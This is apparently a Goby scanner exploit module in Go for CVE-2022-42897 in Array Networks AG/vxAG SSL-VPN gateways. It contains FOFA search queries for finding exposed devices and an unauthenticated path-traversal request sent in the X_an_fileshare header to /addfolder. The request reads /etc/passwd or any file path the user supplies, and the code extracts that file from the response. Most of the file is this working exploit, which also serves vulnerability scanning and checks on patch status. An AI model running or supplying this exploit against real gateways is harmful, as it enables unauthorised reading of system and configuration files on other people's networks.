package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Array Networks AG/vxAG addfolder path Code Execution (CVE-2022-42897)",
    "Description": "<p>Array Networks AG/vxAG is an Array SSL-VPN gateway product of Array Networks in the United States.</p><p>Array Networks AG/vxAG with ArrayOS AG prior to 9.4.0.469 has a security vulnerability that allows an unauthenticated attacker to achieve command injection, resulting in privilege escalation and control over the system.</p>",
    "Product": "Array-VPN",
    "Homepage": "https://arraynetworks.com/",
    "DisclosureDate": "2023-01-03",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"_AN_hassession\" || body=\"/http/localh/welcome\" || body=\"_AN_has_iframe\" || body=\"/http/localhost/an_util.js\" || body=\"/prx/000/http/hostlocal\"",
    "GobyQuery": "body=\"_AN_hassession\" || body=\"/http/localh/welcome\" || body=\"_AN_has_iframe\" || body=\"/http/localhost/an_util.js\" || body=\"/prx/000/http/hostlocal\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p> <a href=\"https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html\">The vendor has released a bug fix, please pay attention to the update in time:https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/prx/000/http/localhost/client_sec/../addfolder",
                "follow_redirect": false,
                "header": {
                    "X_an_fileshare": "uname=t;password=t;sp_uname=t;flags=c3248;fshare_template=../../../../../../../../../../etc/passwd"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "AN_global_var_init",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/prx/000/http/localhost/client_sec/../addfolder",
                "follow_redirect": false,
                "header": {
                    "X_an_fileshare": "uname=t;password=t;sp_uname=t;flags=c3248;fshare_template={{{filePath}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2022-42897"
    ],
    "CNNVD": [
        "CNNVD-202210-770"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Array Networks AG/vxAG addfolder 接口代码执行漏洞（CVE-2022-42897）",
            "Product": "Array-VPN",
            "Description": "<p>Array Networks AG/vxAG是美国安瑞科技（Array Networks）公司的一款 Array SSL-VPN 网关产品。<br></p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html\">https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html</a></p>",
            "Impact": "<p><br>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Array Networks AG/vxAG addfolder path Code Execution (CVE-2022-42897)",
            "Product": "Array-VPN",
            "Description": "<p>Array Networks AG/vxAG is an Array SSL-VPN gateway product of Array Networks in the United States.<br></p><p>Array Networks AG/vxAG with ArrayOS AG prior to 9.4.0.469 has a security vulnerability that allows an unauthenticated attacker to achieve command injection, resulting in privilege escalation and control over the system.<br></p>",
            "Recommendation": "<p> <a href=\"https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html\">The vendor has released a bug fix, please pay attention to the update in time:https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-04",
    "PocId": "10786"
}`

	isSuccessSendHttpRequest854sdsh := func(hostInfo *httpclient.FixUrl, setHeaderList map[string]string) (*httpclient.HttpResponse, error) {
		requestConfig := httpclient.NewGetRequestConfig("/prx/000/http/localhost/client_sec/../addfolder")
		for key, value := range setHeaderList {
			requestConfig.Header.Store(key, value)
		}
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, requestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			setHeaderList := map[string]string{
				"X_an_fileshare": "uname=t;password=t;sp_uname=t;flags=c3248;fshare_template=../../../../../../../../../../etc/passwd",
			}
			resp, err := isSuccessSendHttpRequest854sdsh(hostInfo, setHeaderList)
			return err ==nil && strings.Contains(resp.RawBody, "root:*:0:0") && strings.Contains(resp.RawBody, "AN_global_var_init")
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := goutils.B2S(singleScanConfig.Params["filePath"])
			setHeaderList := map[string]string{
				"X_an_fileshare": "uname=t;password=t;sp_uname=t;flags=c3248;fshare_template=" + filePath,
			}
			resp, err := isSuccessSendHttpRequest854sdsh(expResult.HostInfo, setHeaderList)
			if err !=nil {
				expResult.Success = false
				expResult.Output = "Error,maybe there are no vulnerability"
				return expResult
			}
			regex := regexp.MustCompile(`</script>([\s\S]*?)<tr>`)
			matches := regex.FindStringSubmatch(resp.RawBody)
			var wantToRead string
			if len(matches) > 0 {
				wantToRead = strings.TrimSpace(matches[0])
				lines := strings.Split(wantToRead, "\n")
				filteredLines := lines[3 : len(lines)-1]
				wantToRead = strings.Join(filteredLines, "\n")
			}
			if !strings.Contains(resp.RawBody, "Content-Type: text/html; charset=No message available") && strings.Contains(resp.RawBody, "AN_global_var_init") {
				expResult.Success = true
				expResult.Output = wantToRead
				return expResult
			}
			return expResult
		},
	))
}
